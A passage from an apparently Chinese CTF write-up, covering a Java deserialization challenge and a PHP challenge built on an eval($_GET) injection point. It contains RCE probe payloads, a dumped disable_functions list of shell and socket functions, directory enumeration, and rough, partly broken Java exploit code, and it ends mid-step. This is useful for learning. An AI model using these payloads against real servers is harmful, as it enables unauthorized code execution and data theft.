+    <span class="token keyword">return</span> <span class="token string">"User{name='"</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">'\''</span> <span class="token operator">+</span> <span class="token string">", age='"</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">+</span> <span class="token string">'\''</span> <span class="token operator">+</span> <span class="token string">", height='"</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>height <span class="token operator">+</span> <span class="token string">'\''</span> <span class="token operator">+</span> <span class="token string">'}'</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>写一个与doPost中相反的exp，得到payload。（java语法还不太懂，先写个雏形，之后填坑）</p>
+<pre class=" language-java"><code class="language-java">User u<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"m4n_q1u_666"</span><span class="token punctuation">,</span> <span class="token string">"666"</span><span class="token punctuation">,</span> <span class="token string">"180"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> textByte<span class="token operator">=</span>SerAndDe<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span>
+Base64<span class="token punctuation">.</span>Encoder encoder <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+string text <span class="token operator">=</span> encoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>textByte<span class="token punctuation">)</span><span class="token punctuation">;</span>
+system<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>
+</code></pre>
+<p>user有个transient修饰的属性height，这是用来声明当前属性不需要反序列化的。注意要写一个与readObject相反的writeObject去强制反序列化。</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">writeObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream s<span class="token punctuation">)</span> <span class="token keyword">throws</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">{</span>
+    s<span class="token punctuation">.</span><span class="token function">defaultWriteObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">//强制序列化name</span>
+    s<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>最后把key和base64字符串打进去就行。</p>
+<h2 id="InterestingPHP"><a href="#InterestingPHP" class="headerlink" title="InterestingPHP"></a>InterestingPHP</h2><h3 id="前置知识-3"><a href="#前置知识-3" class="headerlink" title="前置知识"></a>前置知识</h3><h3 id="题目详解-3"><a href="#题目详解-3" class="headerlink" title="题目详解"></a>题目详解</h3><p>进入题目</p>
+<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> 
+</code></pre>
+<p>是一个RCE注入点，尝试/?exp=var_dump(phpinfo)，回显为NULL，猜测被ban，发现ini_get_all()可以正常运行</p>
+<pre class=" language-1"><code class="language-1">构造：/?exp=var_dump(ini_get_all());
+回显： 
+array(186) { ["allow_url_fopen"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(4) } ["allow_url_include"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(4) } ["arg_separator.input"]=> array(3) { ["global_value"]=> string(1) "&" ["local_value"]=> string(1) "&" ["access"]=> int(6) } ["arg_separator.output"]=> array(3) { ["global_value"]=> string(1) "&" ["local_value"]=> string(1) "&" ["access"]=> int(7) } ["assert.active"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["assert.bail"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["assert.callback"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["assert.exception"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["assert.quiet_eval"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["assert.warning"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["auto_append_file"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(6) } ["auto_detect_line_endings"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["auto_globals_jit"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(6) } ["auto_prepend_file"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(6) } ["browscap"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(4) } ["curl.cainfo"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(4) } ["date.default_latitude"]=> array(3) { ["global_value"]=> string(7) "31.7667" ["local_value"]=> string(7) "31.7667" ["access"]=> int(7) } ["date.default_longitude"]=> array(3) { ["global_value"]=> string(7) "35.2333" ["local_value"]=> string(7) "35.2333" ["access"]=> int(7) } ["date.sunrise_zenith"]=> array(3) { ["global_value"]=> string(9) "90.583333" ["local_value"]=> string(9) "90.583333" ["access"]=> int(7) } ["date.sunset_zenith"]=> array(3) { ["global_value"]=> string(9) "90.583333" ["local_value"]=> string(9) "90.583333" ["access"]=> int(7) } ["date.timezone"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["default_charset"]=> array(3) { ["global_value"]=> string(5) "UTF-8" ["local_value"]=> string(5) "UTF-8" ["access"]=> int(7) } ["default_mimetype"]=> array(3) { ["global_value"]=> string(9) "text/html" ["local_value"]=> string(9) "text/html" ["access"]=> int(7) } ["default_socket_timeout"]=> array(3) { ["global_value"]=> string(2) "60" ["local_value"]=> string(2) "60" ["access"]=> int(7) } ["disable_classes"]=> array(3) { ["global_value"]=> string(116) "Exception,DirectoryIterator,FilesystemIterator,SplFileObject,SplDoublyLinkedList,Error,ErrorException,RedisException" ["local_value"]=> string(116) "Exception,DirectoryIterator,FilesystemIterator,SplFileObject,SplDoublyLinkedList,Error,ErrorException,RedisException" ["access"]=> int(4) } ["disable_functions"]=> array(3) { ["global_value"]=> string(816) "include,include_once,require,require_once,stream_get_contents,fwrite,readfile,file_get_contents,fread,fgets,fgetss,file,parse_ini_file,show_source,fsockopen,proc_open,ini_set,pfsockopen,ini_alter,ini_get,posix_kill,phpinfo,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,passthru,symlink,link,syslog,imap_open,dl,mail,stream_socket_client,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,get_cfg_var" ["local_value"]=> string(816) "include,include_once,require,require_once,stream_get_contents,fwrite,readfile,file_get_contents,fread,fgets,fgetss,file,parse_ini_file,show_source,fsockopen,proc_open,ini_set,pfsockopen,ini_alter,ini_get,posix_kill,phpinfo,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,passthru,symlink,link,syslog,imap_open,dl,mail,stream_socket_client,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,get_cfg_var" ["access"]=> int(4) } ["display_errors"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["display_startup_errors"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["doc_root"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(4) } ["docref_ext"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["docref_root"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["enable_dl"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(4) } ["enable_post_data_reading"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(6) } ["engine"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["error_append_string"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["error_log"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["error_prepend_string"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["error_reporting"]=> array(3) { ["global_value"]=> string(5) "32767" ["local_value"]=> string(5) "32767" ["access"]=> int(7) } ["expose_php"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(4) } ["extension_dir"]=> array(3) { ["global_value"]=> string(55) "/usr/local/lib/php/extensions/no-debug-non-zts-20170718" ["local_value"]=> string(55) "/usr/local/lib/php/extensions/no-debug-non-zts-20170718" ["access"]=> int(4) } ["file_uploads"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(4) } ["filter.default"]=> array(3) { ["global_value"]=> string(10) "unsafe_raw" ["local_value"]=> string(10) "unsafe_raw" ["access"]=> int(6) } ["filter.default_flags"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(6) } ["from"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["hard_timeout"]=> array(3) { ["global_value"]=> string(1) "2" ["local_value"]=> string(1) "2" ["access"]=> int(4) } ["highlight.comment"]=> array(3) { ["global_value"]=> string(7) "#FF8000" ["local_value"]=> string(7) "#FF8000" ["access"]=> int(7) } ["highlight.default"]=> array(3) { ["global_value"]=> string(7) "#0000BB" ["local_value"]=> string(7) "#0000BB" ["access"]=> int(7) } ["highlight.html"]=> array(3) { ["global_value"]=> string(7) "#000000" ["local_value"]=> string(7) "#000000" ["access"]=> int(7) } ["highlight.keyword"]=> array(3) { ["global_value"]=> string(7) "#007700" ["local_value"]=> string(7) "#007700" ["access"]=> int(7) } ["highlight.string"]=> array(3) { ["global_value"]=> string(7) "#DD0000" ["local_value"]=> string(7) "#DD0000" ["access"]=> int(7) } ["html_errors"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["iconv.input_encoding"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["iconv.internal_encoding"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["iconv.output_encoding"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["ignore_repeated_errors"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["ignore_repeated_source"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["ignore_user_abort"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["implicit_flush"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["include_path"]=> array(3) { ["global_value"]=> string(20) ".:/usr/local/lib/php" ["local_value"]=> string(20) ".:/usr/local/lib/php" ["access"]=> int(7) } ["input_encoding"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["internal_encoding"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["last_modified"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["log_errors"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["log_errors_max_len"]=> array(3) { ["global_value"]=> string(4) "1024" ["local_value"]=> string(4) "1024" ["access"]=> int(7) } ["mail.add_x_header"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(6) } ["mail.force_extra_parameters"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(6) } ["mail.log"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(6) } ["max_execution_time"]=> array(3) { ["global_value"]=> string(2) "30" ["local_value"]=> string(2) "30" ["access"]=> int(7) } ["max_file_uploads"]=> array(3) { ["global_value"]=> string(2) "20" ["local_value"]=> string(2) "20" ["access"]=> int(6) } ["max_input_nesting_level"]=> array(3) { ["global_value"]=> string(2) "64" ["local_value"]=> string(2) "64" ["access"]=> int(6) } ["max_input_time"]=> array(3) { ["global_value"]=> string(2) "60" ["local_value"]=> string(2) "60" ["access"]=> int(6) } ["max_input_vars"]=> array(3) { ["global_value"]=> string(4) "1000" ["local_value"]=> string(4) "1000" ["access"]=> int(6) } ["mbstring.detect_order"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["mbstring.encoding_translation"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(6) } ["mbstring.func_overload"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(4) } ["mbstring.http_input"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["mbstring.http_output"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["mbstring.http_output_conv_mimetypes"]=> array(3) { ["global_value"]=> string(31) "^(text/|application/xhtml\+xml)" ["local_value"]=> string(31) "^(text/|application/xhtml\+xml)" ["access"]=> int(7) } ["mbstring.internal_encoding"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["mbstring.language"]=> array(3) { ["global_value"]=> string(7) "neutral" ["local_value"]=> string(7) "neutral" ["access"]=> int(7) } ["mbstring.strict_detection"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["mbstring.substitute_character"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["memory_limit"]=> array(3) { ["global_value"]=> string(4) "128M" ["local_value"]=> string(4) "128M" ["access"]=> int(7) } ["mysqlnd.collect_memory_statistics"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(4) } ["mysqlnd.collect_statistics"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["mysqlnd.debug"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(4) } ["mysqlnd.fetch_data_copy"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["mysqlnd.log_mask"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["mysqlnd.mempool_default_size"]=> array(3) { ["global_value"]=> string(5) "16000" ["local_value"]=> string(5) "16000" ["access"]=> int(7) } ["mysqlnd.net_cmd_buffer_size"]=> array(3) { ["global_value"]=> string(4) "4096" ["local_value"]=> string(4) "4096" ["access"]=> int(7) } ["mysqlnd.net_read_buffer_size"]=> array(3) { ["global_value"]=> string(5) "32768" ["local_value"]=> string(5) "32768" ["access"]=> int(7) } ["mysqlnd.net_read_timeout"]=> array(3) { ["global_value"]=> string(5) "86400" ["local_value"]=> string(5) "86400" ["access"]=> int(7) } ["mysqlnd.sha256_server_public_key"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(2) } ["mysqlnd.trace_alloc"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(4) } ["open_basedir"]=> array(3) { ["global_value"]=> string(13) "/var/www/html" ["local_value"]=> string(13) "/var/www/html" ["access"]=> int(7) } ["openssl.cafile"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(2) } ["openssl.capath"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(2) } ["output_buffering"]=> array(3) { ["global_value"]=> string(4) "4096" ["local_value"]=> string(4) "4096" ["access"]=> int(6) } ["output_encoding"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["output_handler"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(6) } ["pcre.backtrack_limit"]=> array(3) { ["global_value"]=> string(7) "1000000" ["local_value"]=> string(7) "1000000" ["access"]=> int(7) } ["pcre.jit"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["pcre.recursion_limit"]=> array(3) { ["global_value"]=> string(6) "100000" ["local_value"]=> string(6) "100000" ["access"]=> int(7) } ["phar.cache_list"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(4) } ["phar.readonly"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["phar.require_hash"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["post_max_size"]=> array(3) { ["global_value"]=> string(2) "8M" ["local_value"]=> string(2) "8M" ["access"]=> int(6) } ["precision"]=> array(3) { ["global_value"]=> string(2) "14" ["local_value"]=> string(2) "14" ["access"]=> int(7) } ["realpath_cache_size"]=> array(3) { ["global_value"]=> string(5) "4096K" ["local_value"]=> string(5) "4096K" ["access"]=> int(4) } ["realpath_cache_ttl"]=> array(3) { ["global_value"]=> string(3) "120" ["local_value"]=> string(3) "120" ["access"]=> int(4) } ["redis.arrays.autorehash"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["redis.arrays.functions"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["redis.arrays.hosts"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["redis.arrays.index"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["redis.arrays.names"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["redis.arrays.previous"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["redis.clusters.read_timeout"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["redis.clusters.seeds"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["redis.clusters.timeout"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["register_argc_argv"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(6) } ["report_memleaks"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["report_zend_debug"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["request_order"]=> array(3) { ["global_value"]=> string(2) "GP" ["local_value"]=> string(2) "GP" ["access"]=> int(6) } ["sendmail_from"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["sendmail_path"]=> array(3) { ["global_value"]=> string(7) " -t -i " ["local_value"]=> string(7) " -t -i " ["access"]=> int(4) } ["serialize_precision"]=> array(3) { ["global_value"]=> string(2) "-1" ["local_value"]=> string(2) "-1" ["access"]=> int(7) } ["session.auto_start"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(2) } ["session.cache_expire"]=> array(3) { ["global_value"]=> string(3) "180" ["local_value"]=> string(3) "180" ["access"]=> int(7) } ["session.cache_limiter"]=> array(3) { ["global_value"]=> string(7) "nocache" ["local_value"]=> string(7) "nocache" ["access"]=> int(7) } ["session.cookie_domain"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["session.cookie_httponly"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["session.cookie_lifetime"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["session.cookie_path"]=> array(3) { ["global_value"]=> string(1) "/" ["local_value"]=> string(1) "/" ["access"]=> int(7) } ["session.cookie_secure"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["session.gc_divisor"]=> array(3) { ["global_value"]=> string(4) "1000" ["local_value"]=> string(4) "1000" ["access"]=> int(7) } ["session.gc_maxlifetime"]=> array(3) { ["global_value"]=> string(4) "1440" ["local_value"]=> string(4) "1440" ["access"]=> int(7) } ["session.gc_probability"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["session.lazy_write"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["session.name"]=> array(3) { ["global_value"]=> string(9) "PHPSESSID" ["local_value"]=> string(9) "PHPSESSID" ["access"]=> int(7) } ["session.referer_check"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["session.save_handler"]=> array(3) { ["global_value"]=> string(5) "files" ["local_value"]=> string(5) "files" ["access"]=> int(7) } ["session.save_path"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["session.serialize_handler"]=> array(3) { ["global_value"]=> string(3) "php" ["local_value"]=> string(3) "php" ["access"]=> int(7) } ["session.sid_bits_per_character"]=> array(3) { ["global_value"]=> string(1) "5" ["local_value"]=> string(1) "5" ["access"]=> int(7) } ["session.sid_length"]=> array(3) { ["global_value"]=> string(2) "26" ["local_value"]=> string(2) "26" ["access"]=> int(7) } ["session.trans_sid_hosts"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["session.trans_sid_tags"]=> array(3) { ["global_value"]=> string(32) "a=href,area=href,frame=src,form=" ["local_value"]=> string(32) "a=href,area=href,frame=src,form=" ["access"]=> int(7) } ["session.upload_progress.cleanup"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(2) } ["session.upload_progress.enabled"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(2) } ["session.upload_progress.freq"]=> array(3) { ["global_value"]=> string(2) "1%" ["local_value"]=> string(2) "1%" ["access"]=> int(2) } ["session.upload_progress.min_freq"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(2) } ["session.upload_progress.name"]=> array(3) { ["global_value"]=> string(27) "PHP_SESSION_UPLOAD_PROGRESS" ["local_value"]=> string(27) "PHP_SESSION_UPLOAD_PROGRESS" ["access"]=> int(2) } ["session.upload_progress.prefix"]=> array(3) { ["global_value"]=> string(16) "upload_progress_" ["local_value"]=> string(16) "upload_progress_" ["access"]=> int(2) } ["session.use_cookies"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["session.use_only_cookies"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["session.use_strict_mode"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["session.use_trans_sid"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["short_open_tag"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(6) } ["SMTP"]=> array(3) { ["global_value"]=> string(9) "localhost" ["local_value"]=> string(9) "localhost" ["access"]=> int(7) } ["smtp_port"]=> array(3) { ["global_value"]=> string(2) "25" ["local_value"]=> string(2) "25" ["access"]=> int(7) } ["sqlite3.defensive"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(4) } ["sqlite3.extension_dir"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(4) } ["sys_temp_dir"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(4) } ["track_errors"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["unserialize_callback_func"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["upload_max_filesize"]=> array(3) { ["global_value"]=> string(2) "2M" ["local_value"]=> string(2) "2M" ["access"]=> int(6) } ["upload_tmp_dir"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(4) } ["url_rewriter.hosts"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["url_rewriter.tags"]=> array(3) { ["global_value"]=> string(5) "form=" ["local_value"]=> string(5) "form=" ["access"]=> int(7) } ["user_agent"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["user_dir"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(4) } ["user_ini.cache_ttl"]=> array(3) { ["global_value"]=> string(3) "300" ["local_value"]=> string(3) "300" ["access"]=> int(4) } ["user_ini.filename"]=> array(3) { ["global_value"]=> string(9) ".user.ini" ["local_value"]=> string(9) ".user.ini" ["access"]=> int(4) } ["variables_order"]=> array(3) { ["global_value"]=> string(4) "GPCS" ["local_value"]=> string(4) "GPCS" ["access"]=> int(6) } ["xbithack"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["xmlrpc_error_number"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["xmlrpc_errors"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(4) } ["zend.assertions"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["zend.detect_unicode"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["zend.enable_gc"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["zend.multibyte"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(2) } ["zend.script_encoding"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["zend.signal_check"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(4) } ["zlib.output_compression"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["zlib.output_compression_level"]=> array(3) { ["global_value"]=> string(2) "-1" ["local_value"]=> string(2) "-1" ["access"]=> int(7) } ["zlib.output_handler"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } } 
+</code></pre>
+<p>主要看<em><strong>disable_functions/disable_class/open_basedir</strong></em>中的信息<br>使⽤ scandir() 来探测⽬录⽂件发现存在⼀个 secret.rdb ⽂件，构造payload（注意括号里面的.要用双引号或者单引号括起来，感谢桥桥的援助）</p>
+<pre class=" language-1"><code class="language-1">/?exp=var_dump(scandir('.'))
+array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) "index.php" [3]=> string(10) "secret.rdb" } 
+</code></pre>
+<p>可以直接输出出来，构造</p>
